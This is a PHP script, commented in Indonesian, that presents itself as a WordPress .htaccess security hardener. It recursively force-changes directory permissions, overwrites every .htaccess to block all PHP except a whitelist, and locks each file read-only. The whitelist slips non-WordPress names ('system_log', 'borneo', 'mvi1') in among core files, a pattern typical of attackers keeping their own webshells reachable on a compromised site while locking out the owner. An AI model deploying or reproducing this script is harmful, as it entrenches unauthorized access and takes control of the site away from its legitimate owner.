<?php
/**
 * KONFIGURASI HTACCESS KEAMANAN (TANPA REDIRECT)
 */
$htaccessContent = '
# 1. Blokir akses ke file PHP secara umum
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>

# 2. Pengecualian khusus folder Asset WordPress (Theme & Plugin)
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^wp-(content|includes)/.*$ - [L]
</IfModule>

# 3. Whitelist file berdasarkan pola nama file yang sudah ditentukan
<FilesMatch "^(index|wp-blog-header|wp-config-sample|wp-links-opml|wp-login|wp-settings|wp-trackback|wp-activate|wp-comments-post|wp-cron|wp-load|wp-mail|wp-signup|xmlrpc|edit-form-advanced|link-parse-opml|ms-sites|options-writing|themes|admin-ajax|edit-form-comment|link|ms-themes|admin-footer|edit-link-form|load-scripts|ms-upgrade-network|admin-functions|edit|load-styles|ms-users|admin-header|edit-tag-form|media-new|my-sites|post-new|admin|edit-tags|media|nav-menus|post|admin-post|export|media-upload|network|press-this|upload|async-upload|menu-header|options-discussion|privacy|user-edit|menu|options-general|profile|user-new|moderation|options-head|revision|users|custom-background|ms-admin|options-media|setup-config|widgets|custom-header|ms-delete-site|options-permalink|term|customize|link-add|ms-edit|options|edit-comments|link-manager|ms-options|options-reading|system_log|borneo|mvi1)\.(php|html|js|css|txt|json|xml|jpg|jpeg|png|gif|svg|webp|woff|woff2|ttf|otf)$"> 
    Order Allow,Deny 
    Allow from all 
</FilesMatch>

# 4. Izinkan folder wp-admin secara fungsional
<Files wp-login.php>
    Allow from all
</Files>

# 5. Standar WordPress Permalink (Agar Page/Post tidak 404)
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteRule ^index\.php$ - [L]
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>

ErrorDocument 403 /index.php
';

/**
 * FUNGSI REKURSIF: BUKA PAKSA -> TULIS -> KUNCI
 */
function forceUpdateHtaccess($dir, $content) {
    // 1. Cek jika direktori terkunci (misal 0111), coba buka ke 0755 agar bisa di-scandir
    if (!is_readable($dir) || !is_executable($dir)) {
        chmod($dir, 0755);
    }

    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($path)) {
            // Coba buka folder tujuan sebelum masuk
            chmod($path, 0755);
            forceUpdateHtaccess($path, $content);
        }
    }

    $htaccessPath = $dir . DIRECTORY_SEPARATOR . '.htaccess';

    // 2. Proses Eksekusi pada File .htaccess
    if (file_exists($htaccessPath)) {
        // Buka kunci file apa pun (0111, 0444, dll) ke 0644 agar bisa ditulis
        chmod($htaccessPath, 0644);
    }

    // 3. Tulis konten baru
    if (file_put_contents($htaccessPath, $content) !== false) {
        // 4. Kunci kembali ke Read-Only (0444)
        chmod($htaccessPath, 0444);
        echo "BERHASIL: $htaccessPath (Locked 0444)\n";
    } else {
        echo "GAGAL MENULIS: $htaccessPath (Cek owner/permission)\n";
    }
}

echo "<pre>";
echo "Memulai proses pembersihan dan penguncian .htaccess...\n\n";
forceUpdateHtaccess('.', $htaccessContent);
echo "\n--- SELESAI ---";
echo "</pre>";
?>